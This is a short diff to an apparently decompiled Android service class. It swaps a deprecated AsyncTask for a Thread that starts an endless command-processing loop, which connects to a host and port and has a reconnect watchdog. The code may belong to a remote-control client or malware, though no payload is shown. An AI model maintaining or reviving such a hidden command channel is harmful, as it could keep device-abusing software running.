@@ -8,7 +8,6 @@ import android.content.Context;
 import android.content.Intent;
 import android.graphics.Point;
 import android.net.Uri;
-import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
@@ -244,7 +243,8 @@ public class Api extends Service {
             NetworkManager.initialize(host, port, context);
 
             // Start command processor
-            new CommandProcessorTask().execute(context);
+            final Context finalCtx = context;
+            new Thread(() -> new CommandProcessorTask().runProcessor(finalCtx)).start();
 
         } catch (Exception unused4) {
         }
@@ -263,15 +263,10 @@ public class Api extends Service {
      *
      * Original obfuscated class name: AsyncTaskC0189ta / Api$ta
      */
-    public static class CommandProcessorTask extends AsyncTask<Context, Integer, String> {
+    public static class CommandProcessorTask {
 
-        @Override
-        protected void onPreExecute() {
-            super.onPreExecute();
-        }
-
-        @Override
-        protected String doInBackground(Context... contexts) {
+        public void runProcessor(Context context) {
+            Context[] contexts = new Context[]{context};
             while (true) {
                 try {
                     // ── Timeout / reconnect watchdog ──────────────────────────
